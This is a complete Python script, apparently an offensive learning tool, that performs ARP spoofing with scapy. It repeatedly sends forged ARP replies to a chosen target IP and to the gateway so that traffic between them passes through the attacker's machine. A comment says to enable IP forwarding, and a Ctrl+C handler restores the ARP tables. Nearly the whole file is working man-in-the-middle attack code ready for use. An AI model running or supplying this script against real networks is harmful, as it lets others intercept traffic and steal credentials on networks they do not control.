#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import optparse
#use 1 > /proc/sys/net/ipv4/ip_forward to enable ipv4 forwarding
#if the above is not enabled the traget will not have access to internet

def get_parameters():
    print("TIP make sure that you have enabled IP Forwarding ..")
    parse=optparse.OptionParser()
    parse.add_option("-t", "--target", dest="target_ip", help="Provide target system IP address.")
    parse.add_option("-g", "--gateway", dest="gateway_ip", help="Provide the IP address of the router")
    (options, arguments) = parse.parse_args()
    if not options.target_ip:
        parse.error("[-]Please specify the Target IP address, use --help for more info.")
    elif not options.gateway_ip:
        parse.error("[-]Please specify the Router's IP address, use --help for more info")
    return options

def get_mac(ip):
    arp_request =scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst =target_ip, hwdst=target_mac, psrc=spoof_ip) # routers IP
    scapy.send(packet, verbose = False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc = src_ip, hwsrc = src_mac)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, count=4, verbose=False)

options = get_parameters()

target_ip = options.target_ip
gateway_ip = options.gateway_ip

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count+=2
        print("\r[+] Sent packets : " + str(sent_packets_count), end="")
        #sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Dectected CTRL + C ...... Resetting ARP tables. \n...... Exiting program.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)